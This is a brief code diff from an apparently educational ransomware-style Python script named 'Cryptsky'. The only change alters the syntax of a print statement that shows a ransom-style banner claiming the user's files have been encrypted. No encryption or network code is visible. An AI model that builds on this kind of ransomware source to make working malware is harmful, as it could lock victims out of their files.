@@ -27,7 +27,7 @@ def main():
     decrypt = args['decrypt']
 
     if decrypt:
-        print (''')
+        print '''
 Cryptsky!
 ---------------
 Your files have been encrypted. This is normally the part where I would
